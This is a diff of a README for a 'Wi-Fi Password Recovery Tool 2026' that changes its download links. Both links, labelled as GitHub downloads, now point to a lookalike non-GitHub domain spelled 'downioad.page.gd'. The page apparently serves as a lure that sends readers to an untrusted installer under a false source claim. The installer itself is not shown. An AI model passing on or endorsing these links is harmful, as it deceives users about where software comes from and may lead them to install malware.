@@ -2,7 +2,7 @@
 
 Wi-Fi Password Recovery Tool 2026 is a reliable Windows utility designed to help users retrieve saved Wi-Fi passwords from their computer. Whether you've forgotten your network password or need to share it with a guest, this tool makes it effortless to access your stored credentials on Windows 10 and Windows 11.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -60,7 +60,7 @@ Yes, especially with the portable version. Simply copy the tool to a USB drive a
 
 To get the latest version of Wi-Fi Password Recovery Tool 2026, visit the official download page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 This link provides access to the installer and additional resources. Ensure you download only from trusted sources to maintain system security.
 
